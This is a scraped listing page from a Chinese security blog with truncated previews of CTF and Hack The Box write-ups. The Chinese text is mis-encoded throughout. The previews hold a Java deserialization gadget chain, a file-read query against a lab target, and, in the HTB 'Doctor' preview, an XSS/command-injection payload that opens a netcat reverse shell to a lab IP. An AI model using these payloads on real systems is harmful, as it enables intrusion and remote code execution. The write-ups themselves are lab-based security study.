1234567891011121314151617Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;), ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/10/31/general/DASCTF/" title="DASCTF">     <img class="post_bg" src="/img/cover3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DASCTF"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/10/31/general/DASCTF/" title="DASCTF">DASCTF</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time datetime="2021-10-31T08:31:17.000Z" title="å‘è¡¨äº 2021-10-31 16:31:17">2021-10-31</time></span></div><div class="content">å®¡è®¡æºç å‘ç°æœ‰å˜é‡è¦†ç›–æ¼æ´ï¼Œå¯ä»¥æŠŠtemplateè¦†ç›–ï¼Œé…åˆfile_get_contentsé€ æˆä»»æ„æ–‡ä»¶è¯»å–
å°è¯•è¯»template.php
1?var[template][1]=template.php&amp;tp=1

123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpclass Template&#123;    public $content;    public $pattern;    public $suffix;    public function __construct($content)&#123;        $this-&gt;content = $content;        $this-&gt;pattern = &quot;/&#123;&#123;([a-z]+)&#125;&#125;/&quot;;        $this-&gt;suffix = &quot;.html&quot;;    &#125;    public funct ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/10/31/general/%5BHTB%5DDT/" title="Docter">     <img class="post_bg" src="/img/cover3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Docter"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/10/31/general/%5BHTB%5DDT/" title="Docter">Docter</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time datetime="2021-10-31T08:31:17.000Z" title="å‘è¡¨äº 2021-10-31 16:31:17">2021-10-31</time></span></div><div class="content">
éœ€è¦æ·»åŠ ä¸€æ¡hosts

10.10.10.209    doctors.htb

é¦–å…ˆnmapæ‰«ä¸€æ³¢

æœ‰ç™»å½•æ¡†ï¼Œæ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œç™»é™†ä¸Šæœ‰ä¸€ä¸ªç•™è¨€ç•Œé¢ï¼Œçœ‹å¤§ä½¬å¯ä»¥XSSåå¼¹shell(: 
ps:æ¶‰åŠåˆ°æˆ‘çš„çŸ¥è¯†ç›²åŒºäº†
åˆ©ç”¨çš„æ˜¯ncçš„-e``-cï¼Œåªæœ‰åœ¨nc.traditionalç‰ˆæœ¬ä¸­æ‰æœ‰ï¼Œè€Œæ­£å¸¸çš„ubuntuå‘è¡Œç‰ˆæ˜¯nc.openbsd
ä¸å¸¦-e``-c


åˆ©ç”¨
1&lt;img src=http://10.10.14.2/$(nc.traditional$IFS-e$IFS/bin/bash$IFS&#x27;10.10.14.2&#x27;$IFS&#x27;4444&#x27;)&gt;



æˆåŠŸå¼¹åˆ°shellï¼Œå¯ä»¥ç”¨pythonå»ºç«‹ä¸€ä¸ªä¼ªç»ˆç«¯
python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
çœ‹å¤§ä½¬è¿˜å¯ä»¥ç”¨ssti
åœ¨/archiveé¡µé¢å¯ä»¥è§¦å‘

åŒæ ·å¯ä»¥åå¼¹shell
1&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses_ ...</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/#content-inner">2</a><a class="page-number" href="/page/3/#content-inner">3</a><a class="extend next" rel="next" href="/page/2/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/konglong.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">f4l1k</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">22</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/falipan"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/falipan" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/12/12/java_study/jndi%E6%B3%A8%E5%85%A5/" title="jndiæ³¨å…¥"><img src="/img/cover3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="jndiæ³¨å…¥"/></a><div class="content"><a class="title" href="/2021/12/12/java_study/jndi%E6%B3%A8%E5%85%A5/" title="jndiæ³¨å…¥">jndiæ³¨å…¥</a><time datetime="2021-12-12T11:19:50.000Z" title="å‘è¡¨äº 2021-12-12 19:19:50">2021-12-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/09/general/codql%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/" title="codqlåˆæ¬¡å°è¯•"><img src="/img/cover5.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="codqlåˆæ¬¡å°è¯•"/></a><div class="content"><a class="title" href="/2021/12/09/general/codql%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/" title="codqlåˆæ¬¡å°è¯•">codqlåˆæ¬¡å°è¯•</a><time datetime="2021-12-09T12:06:09.000Z" title="å‘è¡¨äº 2021-12-09 20:06:09">2021-12-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/04/java_study/java-day9/" title="filter å†…å­˜é©¬"><img src="/img/cover3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="filter å†…å­˜é©¬"/></a><div class="content"><a class="title" href="/2021/12/04/java_study/java-day9/" title="filter å†…å­˜é©¬">filter å†…å­˜é©¬</a><time datetime="2021-12-04T08:20:17.000Z" title="å‘è¡¨äº 2021-12-04 16:20:17">2021-12-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/27/java_study/java_day8/" title="java å­¦ä¹ æ—¥ç¨‹ï¼ˆå†…å­˜é©¬ï¼‰"><img src="/img/cover3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java å­¦ä¹ æ—¥ç¨‹ï¼ˆå†…å­˜é©¬ï¼‰"/></a><div class="content"><a class="title" href="/2021/11/27/java_study/java_day8/" title="java å­¦ä¹ æ—¥ç¨‹ï¼ˆå†…å­˜é©¬ï¼‰">java å­¦ä¹ æ—¥ç¨‹ï¼ˆå†…å­˜é©¬ï¼‰</a><time datetime="2021-11-27T05:55:46.000Z" title="å‘è¡¨äº 2021-11-27 13:55:46">2021-11-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/21/java_study/java_day7/" title="java å­¦ä¹ æ—¥ç¨‹ï¼ˆåŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼‰"><img src="/img/cover2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java å­¦ä¹ æ—¥ç¨‹ï¼ˆåŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼‰"/></a><div class="content"><a class="title" href="/2021/11/21/java_study/java_day7/" title="java å­¦ä¹ æ—¥ç¨‹ï¼ˆåŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼‰">java å­¦ä¹ æ—¥ç¨‹ï¼ˆåŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼‰</a><time datetime="2021-11-21T11:18:23.000Z" title="å‘è¡¨äº 2021-11-21 19:18:23">2021-11-21</time></div></div></div></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>æ ‡ç­¾</span></div><div class="card-tag-cloud"><a href="/tags/CTF/" style="font-size: 1.3em; color: #99a1ac">CTF</a> <a href="/tags/HTB/" style="font-size: 1.1em; color: #999">HTB</a> <a href="/tags/java-study/" style="font-size: 1.5em; color: #99a9bf">java_study</a> <a href="/tags/study/" style="font-size: 1.3em; color: #99a1ac">study</a></div></div></div></div></main><footer id="footer" style="background-image: url('/img/cover5.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By f4l1k</div><div class="icp"><a target="_blank" rel="noopener" href="http://www.beian.gov.cn/"><img class="icp-icon" src="/img/beian.png"/><span>çš–ICPå¤‡19022789å·</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">æœ¬åœ°æœç´¢</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><script async="async">var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())
setTimeout(function(){preloader.endLoading();}, 5000);</script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>